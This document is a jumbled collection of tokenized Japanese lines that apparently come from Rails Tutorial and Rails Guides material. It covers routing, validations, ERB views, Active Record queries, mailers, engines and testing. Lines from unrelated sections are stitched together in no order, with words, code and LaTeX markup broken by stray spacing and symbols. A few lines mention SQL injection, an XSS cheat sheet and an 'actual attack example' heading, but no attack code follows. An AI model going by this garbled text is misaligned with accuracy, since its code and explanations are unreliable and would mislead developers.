</ h 2 >
さらに 、  _ ユーザー 入力 を 部分 的 に 元 に し た レスポンス ヘッダ を 生成 する とき に 、 自分 が 何 を し て い る の か を 正し く 知 っ て お く こと が 重要 で す 。
上 の コード は 、 `_link_ area ▖html ▖erb ` と い う 名前 の パーシャル を 探 し 、 `_graybar▖html ▖erb ` と い う 名前 の レイアウト を 使用 し て レンダリング を 行 い ま す 。
{ 0 } 図 7 ▖ 5 { / 0 }   { 1 } URL   / users / 1   の ルーティング は 有効 だ が ページ が な い 状態 { / 1 }
   def  perform ( video)
self を 省略 し た 結果 を リスト \ ref{ code :branch_no_raise } に 示 し ま す 。
今後 登場 する スタイル 要素 を 利用 でき る よう に する ため に 、 \ kode { home▖html ▖erb } ビュー に 特別 な 要素 を いく つ か 追加 し ま す ( リスト \ ref{ code : signup_button } ) 。
##### ` collection ▖ create ! (
こう い っ た 場合 に も 対応 でき る よう に する ため 、 リスト \ ref{ code :micropost _model_ image_validation } で 実装 し た サーバー 側 の バリデーション も 重要 な の で す 。
Users リソース 追加 後 の の ユーザー 表示 ページ
          In dex  Cond :   ( id   =   1 )
gem 設定 ファイル を 作成 する 。
条件 は ハッシュ を 使用 し て 指定 する こと も でき ま す 。
   belongs_to   : representative
したが っ て 、 Microposts の リソース は リスト \ ref{ code :microposts_resource } の よう に な り ま す 。
  >> @foo╼  => nil ╼  >> @foo  = @foo  || " bar " ╼  => " bar " ╼  >> @foo  = @foo  || " baz " ╼  => " bar "
Rails アプリケーション の 実行 は 、 アプリケーション の ルート ディレクトリ (`/` など ) で 行な う こと が 前提 と な っ て い ま す 。
パス や URL を 生成 する こと も でき ま す 。
` : instance_ accessor ` オプション を ` false ` に 設定 すれ ば 、 どちら の インスタンス メソッド も 生成 さ れ ま せ ん 。
Cucumber を 使用 する と 、 アプリケーション の 振る舞い を テキスト ベース の 「 \emph { ストーリー } 」 で 定義 する こと が でき ま す 。
this
データ を データベース に 保存 する 前 に バリデーション を 実行 する 方法 は 、 他 に も データベース ネイティブ の 制約 機能 、 クライアント 側 で の バリデーション 、 コントローラ レベル の バリデーション など 、 多く の 方法 が あ り ま す 。
個別 の 属性 を 検証 する ため の カスタム バリ データ を 追加 する に は 、 ` ActiveModel : : EachValidator ` を 使用 する の が 最も 簡単 で 便利 で す 。
#   If  the  collection   has   been  loaded  ( コレクション が 読み込 ま れ る と )
# =>  " user % 5 Bid % 5 D = 89&user % 5 Bname % 5 D = John + Smith "
Users コントローラ に \ kode { following } アクション と \ kode { followers } アクション を 追加 する
ERB テンプレート の 内部 で は 、 `<% %>` タグ や `<%= %>` タグ に Ruby コード を 含め る こと が でき ま す 。
続 い て 、 クラウド ホスティング プロバイダー が 提供 する CD N サービス と 契約 を 結 ぶ 必要 も あ り ま す 。
上 の 例 に も 示 さ れ て い る よう に 、 増分 値 に は 負 の 数 も 指定 でき ま す 。
12345678 90 ▖ 506 ▖ to_s(:currency )                 # =>  $ 1 , 23 4 ,5 6 7,890 ▖ 5 1
{ 0 } 図 1 ▖ 3 { / 0 }   { 1 } デフォルト の Rails ページ ▟ \ href { http://railstutorial ▖org / images/figures/riding _ rails _ 4 _ 0 - full ▖ png } { ( 拡大 ) } { / 1 }
` alias _ method_ chain ` メソッド を 使用 する と 、 上 の よう な パターン を 簡単 に 行え ま す 。
image_ path ( " edit▖ png " )  # => /assets/edit - 2 d 1 a2 db 63 fc 738690021 fedb 5 a 65 b 68e ▖ png
ブラウザ は ネイティブ で は \ texttt { DELETE } リクエスト を 送信 でき な い ため 、 Rails で は Java Script を 使用 し て これ を 偽造 し ま す 。
\ kode {new } フォーム と \ kode {edit } フォーム を パーシャル 化 する
` none ` メソッド は 、 連鎖   ( chain )   可能 な リレーション を 返 し ま す   ( レコード は 返 し ま せ ん ) 。
テーブル を 結合 する
#   新し い アセット パイプライン で 必要
< li ><%=  user▖ name  %></ li >
authors▖ compact !
実際 に は 、 これ に 非常 に 近 い \ kode {flash▖now } を 使 い ま す が 、 本当 に 必要 に な る まで は 使 わ な い よう に し よう か と 思 い ま す 。
スタック 全体 を 考慮 に 入れ れ ば 、 振る舞い の 変化 する は あちこち に 見つか り ま す ▟ ` ActionView: : Helpers: : Asset TagHelper#image_tag ` など が 典型 で す 。
統合 テスト を 使 う こと で 送信 フォーム の 振る舞い を 検証 し たり 、 バグ の 発生 を 検知 し たり でき る
` respond_ with ` および クラス レベル の ` respond_to ` メソッド は 、 ` responders`   gem に 移転 し ま し た 。
属性 に 関連 する エラー が な い 場合 は 空 の 配列 を 返 し ま す 。
  $ rails   destroy   model   Foo
{ 0 } 図 5 ▖ 4 { / 0 }   { 1 } スペース や 共通 スタイル を 追加 し た 結果 { / 1 }
モデル の 属性 に は 、 リーダー   ( reader ) 、 ライター   ( writer ) 、 述語   ( predicate )   が あ り ま す 。
####  メイラー を 作成 する
こう する こと で 英語 に 近 い 自然 な 表記 が 可能 に な り 、 さらに コンパクト に な り ま す
      invoke     helper
フィールド の ラベル を 作成 し ま す 。
###  Production ログ の レベル
   validates : terms _of_service ,   acceptance :  {  accept : 'yes'  }
この 場合 、 ` destroy` (`/photos/:id ` へ の ` DELETE ` リクエスト )   を 除 い て 通常 の ルーティング が 生成 さ れ ま す 。
password_digest :   " $ 2 a $ 10 $ A 58 /j 7w wh3aAffGkMAO 9Q ▖ jjh3jshd ▖ 6 akh▖▖▖ "
   <option   value = " 2 " > Sam </ option >
ファクトリー の シーケンス と い う 考え を 応用 し て 、 テスト 用 に 30 人 の ユーザー を 作成 し ま す ▟ ページ ネーション を 行 う に は これ で 十分 で す 。
基本 的 な 手順 は 次 の よう に な り ま す 。
<%=   form_tag ( { action : " post " } ,  multipart :  true )   do  %>
アカウント 有効 化 機能 と パスワード 再 設定 の 機能 が 追加 さ れ た こと で 、 ついに サンプル アプリケーション の 登録 、 ログ イン 、 ログ アウト 機能 が すべて 本格 的 に 実装 完了 し ま し た 。
Rails   API サイト の \ kode { ActiveRecord : : Base } の 項 を 読 み 通 し 、 どんな こと が でき る か を 把握 し て くださ い 。
ここ から お わか り だ と 思 い ま す が 、 Cucumber は RSpec と 同様 Rake タスク から 呼び出 す こと も でき ま す 。
ection blocks  ( end ) ╼╼╼    %  subsection  arrays_and _ranges   ( end ) ╼╼    \ subsection { ハッシュ と シンボル } %  ( fold) ╼    \ label{ sec : hashes_and_symbols }╼╼
この 一行 メソッド は 、 単に \ kode {@ current_user } インスタンス 変数 を 設定 し 、 後 に 使用 する ため に ユーザー を 効率 よ く 保存 し ま す 。
         run  bun dle  install
flash を テスト する ため の テンプレート
select_tag   " people " ,   " <option > David < /option > "
この エンジン は ブログ 機能 を ホスト アプリケーション に 追加 し 、 記事 と コメント を 作成 でき ま す 。
次 は 、 ユーザー が 自分 の プロフィール 情報 を 編集 でき る よう に する 予定 で す ▟ これ は { 0 } 第 { 1 } 9 { / 1 } 章 { / 0 } の 最終 目標 で も あ り ま す 。
      "#{ data} ! "
User ▖ w here ( id :   1 ) ▖ includes(:articles ) ▖ explain
Rails に は セキュリティ の 高 い アプリケーション を 開発 する の に 便利 な 機能 が 多数 あ り 、 ここ で は その 機能 に 引っかか っ た の で す 。
整数 のみ に マッチ さ せ た い 場合 は 、 ` : only_ integer ` を true に し ま す 。
エンジン の 基本 クラス は ` lib/blorgh/engine ▖rb ` の 中 に あ り ま す 。
ren der  file : "/ path/to/rails/app/views/books/edit▖html ▖erb "
以下 の 機能 は どれ も 難易 度 が それ なり に 高 い の で 、 実装 に 必要 と な る か も しれ な い ツール に つ い て の ヒント も 書 い て お き ま し た 。
リスト \ ref{ code :user_ model_ password _ reset } で パスワード 再 設定 の メール を 送信 する コード は 、 以下 の 部分 で す 。
d { code }╼\end{ codelisting } ╼╼╼\ subsection { ルーティング の 設定 }  %  ( fold) ╼\ label{ sec : setting_ the_root _ route }╼╼
`ren der ` メソッド に 対 する 呼び出し で は 、 一般 に 以下 の 4 つ の オプション が 使用 でき ま す 。
データベース に \ kode { password_digest } カラム を 置 く と い う 条件 さえ 守 れ ば 、 上 の メソッド を モデル に 追加 する だけ で 新規 ユーザー の 作成 と 認証 を セキュア に する こと が でき ま す 。
` prev_quarter ` は ` last _quarter ` の 別名 で す 。
< h 1 > Listing   Books</ h 1 >
\ kode {user } を 紐付け て 能動 的 関係 を 作成 / 登録 する   ( 失敗 時 に エラー を 出力 )
この 節 で は 、 \emph { ステータス フィード }   ( { 1 } { 2 } 第 12 章 { / 2 } { / 1 } で 完成 さ せ ま す )   の 最初 の ヒント を お 見せ し ま す 。
最後 に 、 Web から 更新 でき る 許可 リスト に \ kode { picture } 属性 を 追加 し ま しょ う 。
Rails   4 ▖ 0 から は 、 ` delete ` メソッド を 使用 する と 、 与え られ た ID に マッチ する レコード を 自動 的 に 探 す よう に な り ま し た 。
この \emph { 順序 リスト } タグ \ kode {ol } を 含 む コード が マイクロ ポスト の 一覧 を 生成 し ま す ▟ ただし ご覧 の とおり 、 実装 の 厄介 な 部分 を マイクロ ポストパーシャル に 任せ て い ま す 。
before フィルター に \ kode { logged \_ in\_user } を 追加 する  
#      2 ▖odd ?   
たとえば 、 1 回 に 5000 件 ずつ 処理 し た い 場合 は 以下 の よう に 指定 し ま す 。
    @url  =  'http://example ▖ com/login'
\ ref{ sec : account_activations _ resource } で 実装 し た 有効 化 メール が 配信 さ れ る はず で す   ( 図 \ ref { fig : activation_email _production } ) 。
なお 、 必要 な gem は ここ まで で すべて インストール し た の で 、 今後 の 章 で は 新た な gem は 追加 し ま せ ん 。
@order _ ids  = @customer▖ order _ ids
{ 0 } { 1 } 第 8 章 { / 1 } { / 0 } の 認証   ( authentication )   システム を 使 え ば 、 \emph {before_ action } を 使用 し て これ を 行え ま す 。
ここ で 記事 を 新規 作成 し よう と する と 、 以下 の よう な BASIC  http 認証 ダイアログ が 表示 さ れ ま す 。
ログ イン し て ユーザー を 保持 する
Cache - Control :   public ,   max - age=2592000
最初 の 例 で は 、 複数 の ルーティング で 同じ 名前 を 使用 し な い よう に すれ ば 回避 でき ま す 。
Article ▖ w here ( trashed:  true ) ▖ rewhere ( trashed :  false )
ユーザー 情報 を 編集 する パターン は 、 ( { 0 } { 1 } 第 7 章 { / 1 } { / 0 } ) の 新規 ユーザー の 作成 と 極めて 似通 っ て い ま す 。
ある カラム を 削除 する よう な 不 可逆 な マイグレーション の 場合 は 、 \ kode { change } メソッド の 代わり に 、 \ kode {up } と \ kode { down } の メソッド を 別々 に 定義 する 必要 が あ り ま す 。
      t ▖integer   : credit_rating
Java Script が 動 か な い ブラウザ の サポート が 必要 な 場合 は 、 ` : authenticity _ token => true ` を フォーム オプション と し て 渡 す か 、 この 設定 を ` true ` に し ま す 。
ection  a_user_object   ( end ) ╼╼  %  section   ruby _ classes   ( end ) ╼╼  \ section { 最後 に } %  ( fold) ╼  \ label{ sec : conclusion}╼╼
従 っ て 、 インスタンス から クラス 属性 を 変更 する こと は でき ま す が 、 ` class_attribute ` で 行 わ れ る よう に 上書き する こと は でき ま せ ん ( 上記 参照 ) 。
is   wrong ▖
しかし Rails チーム は この 種 の メソッド に 依存 し て 欲し く な い と 考え て い ま す 。
  #  config/initializers/secret_token ▖ rb
送信 画像 を 表示 し ま す ▟ この 画像 を クリック する と フォーム が 送信 さ れ ま す 。
d ▖ advance ( seconds :   1 ) ▖ advance ( months :   1 )
たとえば 、 フォロー 用 フォーム 全体 を \ kode { " foobar " } と い う 文字 列 で 置き換え る に は 、 以下 を 使用 し ま す 。
これ を 使用 し て 、 メール が 配信 エージェント に 最終 的 に 渡 さ れ る 直前 に メール の 内容 を 変更 する ため の インター セプタ を 登録 する こと が でき ま す 。
####   その 他 の 拡張
この 節 で は 、 RSpec   gem に よ っ て 提供 さ れ る \ kode {rspec } コマンド を 使 っ て テスト を 実行 し ま す 。
とりあえず 動 く フィード の 実装  
*   Rails   4 ▖ 0 の Action   Pack から Action と Page の キャッシュ 機能 が 取り除 か れ ま し た 。
    < h 1 >Editing   zone </ h 1 >
#     <a type =" integer " > 1 </a>
    INNER   JOIN tags  ON   tags▖ article _ id   =  articles ▖id
<em >emphasized </em>
これ は 、 デザイン パターン で 言 う decorator パターン と し て 実装 する の が 普通 で す 。
user ▖ save
te}╼╼    %  subsection  a_users _ resource   ( end ) ╼╼\ subsection { デバッガー } %  ( fold) ╼\ label{ sec : debugger} ╼╼
User モデル に パスワード 再 設定 用 メソッド を 追加 する
デフォルト は ` false ` で す 。
     create_table  : assemblies_ parts,   id :  false   do  | t |
サイン イン し た ユーザー が これ ら の アクション を ブラウザ で 開 こ う と し た ら 、 ルート URL に リダイレクト する よう に し て くださ い 。
* `load_active_ support`:  Active   Support の 基本 部分 を 設定 する ` active_ support/dependencies ` が 必要 で す 。
id = \ texttt { 1 } の ユーザー を 削除 する アクション
*   エンジン の ビルド 機能
と い っ た 前置 if 文 に 変わ っ て い ま す   ( 訳注 :   1 行 の とき は 後置 if 文 、 2 行 以上 の とき は 前置 if 文 を 使 う の が Ruby の 習慣 で す ) 。
管理 者 が 削除 リンク を クリック する と 、 \ texttt { DELETE } リクエスト が \ kode { destroy } アクション に 向け て 送信 さ れ 、 該当 する ユーザー が 削除 さ れ る
months_ago
#### `ren der ` の オプション
以下 の 例 で 説明 し ま す 。
Rails で は 、 変更 を プッシュ する 時 に テスト スイート を フル 実行 する と い う 慣習 が あ る わけ で は あ り ま せ ん 。
{ 0 } 表 11 ▖ 2 { / 0 }   { 1 } Microposts リソース が 提供 する リスト \ ref{ code :microposts_resource } の RESTful ルート { / 1 }
これ に 対応 する アカウント 有効 化 リンク の ベース URL は 以下 の よう に な り ま す 。
\ href { http://guides▖ rubyonrails ▖org / }{ Rails   Guides}:   トピック 毎 に 分類 さ れ た 最新 の   Rails   リファレンス
この コマンド を 実行 する と 、 4 つ の ファイル が 生成 さ れ ま す 。
注 :   この オプション は   “ remembered  option ”   と 呼 ば れ る もの で 、 この オプション を 一 度 実行 する と コマンド に 保存 さ れ 、 今後 Bundler を 実行 する とき に オプション を 追加 する 必要 が なくな り ま す 。
  encoding :  utf 8
# ==   Schema  Information
これ を 修正 する 方法 の ひと つ は 、 ren der を redirect に 変更 する こと で す 。
Ruby で は 、 あらゆる もの が \ kode { オブジェクト } で す ▟ 文字 列 や \emph {nil } で すら オブジェクト で す 。
###  Rails テンプレート の ` after_bun dle`
上 の よう に 宣言 し て お く と 、 `@employee ▖ subordinates ` と `@employee ▖ manager ` が 使用 でき る よう に な り ま す 。
      invoke     scaffold_controller
` prepared_statements ` を `false ` に 設定 する こと で Prepared   Statements を オフ に でき ま す 。
この ガイド で は 、 Active   Record の バリデーション   ( 検証 :   validation )   機能 を 使用 し て 、 オブジェクト が データベース に 保存 さ れ る 前 に オブジェクト の 状態 を 検証 する 方法 に つ い て 説明 し ま す 。
\ chapter { Toy アプリケーション } %  ( fold) ╼\ label{ cha :a_toy_ app }╼╼
Article ▖ w here ( published:  true ) ▖any?
*   [ 優れ た セキュリティ ブログ ] ( http://ha ▖ ckers▖org/ blog/ ) に は [ XSS チー ト シート ] ( http://ha ▖ ckers▖org / xss ▖html ) が 掲載 さ れ て い ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : current_user_ working } に 示 し ま す 。
私 自身 、 章 の 終わり に あ る 練習 問題 も や り ながら 、 この   \emph { Rails   チュートリアル } を 3 日間 かけ て 一気 に 読破 し ま し た 。
#   Returns  true   if  the  collection   is  empty▖   ( 訳 : コレクション が 空 なら true を 返 す )
#### `ren der ` と ` redirect_to ` の 違い
    private
引数 と し て 指定 さ れ た ソース に あ る スタイル シート へ の リンク タグ を 返 し ま す 。
####  ネスト し た 関連 付け ハッシュ
#   メモ :   a @ person 変数 は コントローラ 側 で 設定 済み で あ る と する  ( @ person   =   Person ▖ new など )
Active   Record に は 2 とおり の ロック 機構 が あ り ま す 。
たとえば 以下 の コード の 場合 、
上 の コード は 以下 の よう に な り ま す 。
class  Order <  ActiveRecord : : Base
|   GET        | /photos/new      |  photos# new        |  new_ image_ path       |
2 番 目 の 方法 は 次 の とおり で す 。
   self ▖ primary _key =  " person _id "
#   日付 の 指定 が な い 場合 、 本日 を デフォルト 値 と する 日付 セレクト ボックス を 生成 する
image_tag ( " icon ▖ png " )  # => < img   src= "/assets/icon ▖ png "   alt = " Icon "  />
#### ` camelize`
\ href { http://aws▖ amazon ▖ com/iam /}{ AWS  Identity  and   Access   Management   ( IAM ) } で ユーザー を 作成 し 、 Access キー と Secret キー を メモ する
" foo " ▖ duplicable ?  
    : discount_cannot_be_greater_than_total_ value
この ジェネレータ に よ っ て 生成 さ れ る もの は すべて 正し く 名前 空間 化 さ れ ま す 。
`symbolize_keys ` メソッド は 、 レシーバ の ハッシュ キー を シンボル に 変換 し た ハッシュ を 返 し ま す 。
アプリケーション から エンジン の 機能 に アクセス でき る よう に する に は 、 エンジン を アプリケーション の ` config/ routes▖rb ` ファイル で マウント する 必要 が あ り ま す 。
date▖end _of_day  # =>  Mon   Jun   0 7   23 : 59 : 59   + 0200   2010
これ ら の 使用 法 に つ い て は この すぐ 後 で 解説 し ま す 。
\ ref{ sec :static _ pages } で 、 最初 の コントローラ で あ る StaticPages コントローラ を 作成 し ま し た 。
アップグレード の 実施 は 、 テスト カバレッジ を きちんと 準備 し て から 行な う よう 、 お 願 い いた し ま す 。
たとえば 、 { 0 } { 1 } 図 1 ▖ 5 { / 1 } { / 0 } を もう 一 度 見 て み る と 、 コード を 80 文字 以下 に 抑え る ため の 小さな 縦線 が 右側 に 見え ま す 。
      # right _menu  { float :   right ;  background - color :   yellow ;  color : black }
サイト リンク の ルート   ( routing )   と URL の マッピング
レシーバー の キー を 直接 文字 列 化 する 破壊 的 な ` stringify _keys ! ` も あ り ま す 。
     def welcome
この 章 で 作成 し た Toy アプリケーション に は 良 い ところ も あ り ま す が 、 さまざま な 弱点 も あ り ま す 。
これ は リスト \ ref{ code : demo_ users_controller } で 使用 さ れ て い ま し た 。
レイアウト の 最後 の 部分 は 、 メイン コンテンツ 用 の \ kode {div } で す 。
require   'other_engine/engine '
Rails に は ` form _ for ` と い う ヘルパー メソッド が あ り 、 主に これ を 使用 し て フォーム を 作成 し ま す 。
_app_setup   ( end ) ╼╼  \ section { 静的 ページ } %  ( fold) ╼  \ label{ sec :static _ pages}╼╼
= > #<User : 0 x 224 ceec @email = nil , @ name =nil >
[ Show  hidden  files ]   を 選択 し て 、 アプリケーション の ルート ディレクトリ に あ る \ kode {▖ gitignore } ファイル を 表示 し ま す   ( 図 \ ref { fig : show _ hidden_files }) ▖
次 に 、 サンプル ユーザー を 作成 する Rake タスク を 追加 し ま す 。
    put  : update_name ,   on :  :member
a 2 ▖ x   =   2
BigDecimal ▖ new ( 5 ▖ 0 0 ,   6 ) ▖ to _ formatted_s  # =>  " 5 ▖ 0 "
最初 に 、 この フィード で 必要 な クエリ に つ い て 考え ま しょ う 。
{ a :   1 ,  b :   2 ,  c :   3 } ▖ sum # => [: b ,   2 ,  : c ,   3 ,  : a ,   1 ]
生成 し た メイラー ごと に 、 ビュー テンプレート が 2 つ ずつ 生成 さ れ ま す ▟ 1 つ は テキスト メール 用 の テンプレート 、 1 つ は HTML メール 用 テンプレート で す 。
Guard は 、 ファイル システム の 変更 を 監視 し 、 たとえば \ kode {static _ pages_test ▖ rb } ファイル など を 変更 する と 自動 的 に テスト を 実行 し て くれ る ツール で す 。
特に 、 表 \ ref{table : RESTful_ password _ resets } の 最初 の ルーティング で は 「 forgot   password 」 フォーム へ の リンク 作成 に 以下 を 使用 し て い ま す 。
####  radio_button
実行 時間 の スピード アップ の ため 、 別 の ターミナル ウィンドウ を 開 い て アプリケーション の ルート ディレクトリ に 移動 し 、 以下 の よう に Spork サーバー を 起動 し ま す 。
最初 の マイクロ ポスト の ユーザー を 破棄 し た 後 、 関連 する マイクロ ポスト も データベース から な く な っ た こと を 確認 する こと で 、 ユーザー の 破棄 を テスト する こと が でき ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : signin_upon_signup } に 示 し ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
\ ref{ sec : signup_success } で も 説明 し ま す が 、 ユーザー の 作成 で 重要 な の は \ kode { input } ごと に あ る 特殊 な \ kode { name } 属性 で す 。
{ 0 } 図 2 ▖ 6   { / 0 } { 1 } ユーザー 表示 用 の ページ   ( \ href { http://local host : 3000 / users / 1 }{ / users / 1 }) { / 1 }
もちろん 、 サブ セレクト を 使用 すれ ば いくら で も スケール アップ でき る など と い う こと は あ り ま せ ん 。
ここ で ` ren der ` メソッド は 非常 に 単純 な ハッシュ を 引数 に 取 り ま す ▟ ハッシュ の キー は ` plain` 、 ハッシュ の 値 は ` params [ : article ] ▖ inspect ` で す 。
ログ イン 用 リンク が 表示 さ れ な く な っ た こと を 確認 する
   var  =  boolean ?   ?
|   app/models/ comment ▖ rb                         |  Comment モデル                                                                                       |
( \ ref{ sec : deploying } の とき と 同じ よう に 警告 メッセージ が 表示 さ れ る こと が あ り ま す が 、 無視 し て 構 い ま せ ん 。
` Module ` の 拡張
` attributes ` や ` connection ` は 関連 付け に 使 っ て は な ら な い 名前 の 例 で す 。
エンジン が 依存 する gem に つ い て は 、 エンジン の ルート ディレクトリ の ` ▖ gemspec ` に 記述 する 必要 が あ り ま す 。
犯罪 的 な ハッカー に と っ て 、 Web アプリケーション フレームワーク の SQL インジェクション の 脆弱 性 に つけ込 み 、 テキスト テーブル の カラム に 凶悪 な コード を 注入 し て 回 る の は たま ら な い 魅力 で す 。
この 文法 は 少々 変わ っ て い て 、 混乱 を 招 く 可能 性 が あ る ため 、 以下 の コード の 動作 を 理解 する よう に し て くださ い 。
SELECT  *  FROM   articles   WHERE   id   >   10   ORDER   BY  id   DESC
" hello " ▖ at ( - 1 )   # =>  " o "
###  記事 を 作成 する
` public/assets/rails - af 27 b 6 a 414 e 6 da00003503 1 48 be 9 b 409 ▖ png ` など 、 ファイル 名 に MD 5 ハッシュ を 含 む ファイル へ の リクエスト に つ い て も 同様 に 扱 わ れ ま す 。
Web アプリケーション の 開発 に は 常 に 困難 が つきまと い ま す ▟ 他人 の 経験 と 失敗 から 学 ぶ こと も 重要 で す 。
` : defaults ` を 指定 し た 場合 、 ` app/assets/javascripts ` ディレクトリ に ` application ▖js ` と い う ファイル が あ れ ば これ も インク ルード さ れ ま す 。
新し い マイクロ ポストフォーム の あ る Home ページ
テスト に パス する 、 Help ページ 用 の コード 。
従 っ て 、 当時 は 以下 の よう な 攻撃 が 可能 に な っ て い ま し た 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/array/grouping ▖ rb ` で す 。
  <%=  comment▖ body %>
文字 列 の うち 、 ` position ` で 指定 さ れ た 位置 から 始ま る 部分 文字 列 を 返 し ま す 。
この validate メソッド で は 、 引数 に シンボル    ( \kode {: picture\ _ size} )   を 取 り 、 その シンボル 名 に 対応 し た メソッド を 呼び出 し ま す 。
この 説 で は 、 \ ref{ sec : resetting_ the_ password } で 用い た パスワード 期限 切れ の 期間 の 比較 が 正し い こと を 証明 し ま す 。
この セクション を 通 し て 、 複雑 さ を 増 し た フィード の 実装 に 進 ん で い き ま す 。
use   ActionDispatch : : Cookies
\ kode { + }   演算 子 を 使用 し て 、 文字 列 を 結合 する こと も でき ま す 。
TIP: _ リソース の ネスティング は 、 ぜひ と も 1 回 に とどめ て 下さ い ▟ 決して 2 回 以上 ネスト する べ き で は あ り ま せ ん ▟ _
Ruby   API   の オン ライン マニュアル を 見つけ て 、 \ kode { Hash } クラス の \ kode {merge } メソッド に つ い て 読 ん で み て くださ い 。
最初 に 、 \ kode {features/} ディレクトリ 内 に \ kode { signing _ in ▖ feature } と い う ファイル を 作成 し ま す 。
Action   Mailer を 使用 する こと で 、 アプリケーション の メイラー クラス や ビュー で メール を 送信 する こと が でき ま す 。
これ は リスト \ ref{ code : will _ paginate_gem } で 使用 さ れ て い ま し た 。
` redefine _method ` メソッド を 使用 すれ ば 、 必要 に 応 じ て 既存 の メソッド が 削除 さ れ る の で 、 この よう な 警告 表示 を 抑制 でき ま す 。
\ kode { signed_ in_user } メソッド を セッション ヘルパー に 移動 する 。
この モジュール は 、 ` div ` など の コンテナ タグ を 生成 する メソッド を 提供 し ま す 。
|                     |  304                | : not _modified                     |
AppName:: Application ▖ config▖ session_store   : cookie_store ,  key:  ' SOMETHINGNEW '
ビュー テンプレート が コード の 繰り返し で うずま っ て 乱雑 に な る の を 避け る ため に 、 フォーム ・ 日付 ・ 文字 列 に 対 し て 共通 の 動作 を 提供 する ヘルパー クラス が 多数 用意 さ れ て い ま す 。
|   GET        | /photos/:id/edit  | images #edit        | edit_photo _ path(:id )  |
ページ の 内容 は 図 \ ref { fig :hello_ world _first_app } とまったく 同じ で す が 、 今 や それ が インターネット 上 の 本番 Web ページ と し て 堂々 と 公開 さ れ て い る の で す 。
{ 0 } 表 11 ▖ 2 { / 0 }   { 1 } Microposts リソース が 提供 する リスト \ ref{ code : demo_microposts_resource } の RESTful ルート { / 1 }
Active   Support で は 、 スライス 操作 を ハッシュ に 対 し て 拡張 し て い ま す 。
メール クライアント は Web サーバー の コンテキスト から 切り離 さ れ て い る の で 、 メール に 記載 する パス で は Web の アドレス の ベース URL は 補完 さ れ ま せ ん 。
エラー が 表示 さ れ て い る フォーム ] ( images/getting _ started/form_with _errors▖ png )
インデックス が 配列 の サイズ より 大き い 場合 は 、 空 の 配列 を 返 し ま す 。
ビュー で すべて の 本 の 属性 を 表示 し た い 場合 は 、 以下 の よう に ERB を 書 く こと が でき ま す 。
def  full _messages
これ は 、 Microsoft   Internet   Explorer   ( IE )   の バージョン が 9 より 小さ い 場合   ( \kode {if lt   IE   9 } )   に のみ 、 囲 ま れ て い る 行 を 実行 し ま す 。
( その 意味 で も 、 RailsCast 「 \ href { http://railscasts▖ com/episodes/275 - how - i - test } { テスティング の 方法 }   ( 英語 ) 」 を ぜひ 一 度 参照 し て くださ い 。
Rails   3 ▖ x で 生成 さ れ た 既存 の 署名 付き cookies は 、 既存 の ` secret_token ` は その まま に し て ` secret_key_ base ` を 新し く 追加 する こと で 透過 的 に アップグレード さ れ ま す 。
{ 0 } 図 6 ▖ 8 { / 0 }   { 1 } User モデル に \ kode { password_digest } 属性 を 追加 する { / 1 }
リスト { p 0 } に あ る { 2 } generate{ / 2 } コマンド の 結果 の ひと つ と し て 、 \emph { マイグレーション } と 呼 ば れ る 新し い ファイル が 生成 さ れ ま す 。
#### `in_groups( number ,  fill_ with  = nil ) `
環境 設定 も 確認 し 、 ` config▖ action_dispatch▖ best _standards_ support ` が あ る 場合 は 削除 し ま す 。
Rails は 以下 の 行 を 含 む デフォルト の ` app/assets/stylesheets/application ▖css ` ファイル も 作成 し ま す 。
#   Generate a   new token  and   store  it  in   token_file ▖
####  実際 の 攻撃 例
# =>  ActiveRecord : : Record NotFound
                      WHERE   follower_ id   = :user_ id "
( この \ kode {- e } オプション は 、 description の 文字 列 が \ kode { " signup   page " } に 一致 する 例 を 単に 実行 する ため の もの で す 。
最後 に 、 ルーティング も エンジン 内 で 分離 さ れ ま す 。
###  悲観 的 ロック   ( pessimistic )
####  radio_button_tag
request ▖ remote_ip )  }
ただし 、 実際 に メール が 生成 さ れ る わけ で は \emph { な い } の で ご 注意 くださ い ▟ ここ に 引用 し た の は サーバー ログ に 出力 さ れ た メール で す
本章 で は 多く の 分野 を カバー し 、 約束 どおり 、 かつて 未 成熟 だっ た アプリケーション を 、 ユーザー 登録 と ログ イン を フル 装備 し た Web サイト に 変身 さ せ ま し た 。
###  制限 を 指定 する
   def  run
Ruby で は 、 メソッド が \emph {true } また は \emph {false } と い う \ kode { 論理 値 ( boolean ) } を 返 す こと を 末尾 の 疑問 符 で 示 す 慣習 が あ り ま す 。
###  使用 する コントローラ を 指定 する
この メソッド は 、 リンク テキスト を 引数 に と り ま す ▟ オプション と し て 次 の よう に \ kode {: href } パラメータ を 加え る と 、
マッチャ が セグメント を パラメータ に 割り当て る 方法 は 直感 的 で す 。
#   記憶 し た URL   ( もしくは デフォルト 値 )   に リダイレクト
    path_suffix   =  qualified_name ▖un derscore
ご 想像 の とおり 、 これ ら の ファイル で は Java Script と 組み込 み Ruby   ( ERb )   を ミックス し て 現在 の ページ に 対 する アクション を 実行 する こと が でき ま す 。
                           foreign_key:   " manager_ id "
その 際 、 表 2 ▖ 1 \ ref{table :user_urls } に 記載 さ れ て い る 、 ページ と URL の 関係 を 参照 する と わか り やす い と 思 い ま す 。
###  Active   Record
それ で は マイグレーション を 実行 し ま しょ う 。
警告 が 表示 さ れ て も 大した こと は あ り ま せ ん が 、 邪魔 に 思え る こと も あ り ま す 。
以下 は 、 ある RESTful ルーティング に 対 し て ` rake   routes ` を 実行 し た 結果 から 抜粋 し た もの で す 。
この テスト で は 、 与え られ た 要素 が 配列 に 含 ま れ て い る か どう か を チェック する \ kode {include ? } メソッド を 使用 し て い ま す
umerate}╼╼    %  subsection  unsuccessful_edits   ( end ) ╼╼    \ subsection { 編集 失敗 時 の テスト } %  ( fold) ╼    \ label{ sec : test ing _unsuccessful_edits}╼╼
パラメータ 名 を ` : username ` に し た く な い 場合 は 、 ルーティング 定義 の ` :username ` の 部分 を 変更 し て くださ い 。
レコード を 更新 でき な い よう ロック する
##### `order `
#### ` parents`
\ kode { create\_table } メソッド は ブロック 変数 を 1 つ 持 つ ブロック   ( \ ref{ sec :blocks})   を 受け取 り ま す ▟ ここ で は   ( “ table ” の 頭 文字 を 取 っ て )   \kode {t } で す 。
*   コントローラ と 同様 、 メイラー クラス の メソッド に も フィルタ 付き の ブロック また は シンボル を 1 つ 指定 する こと が でき ま す 。
git  commit :  % Q {  - m  ' Initial  commit '  }
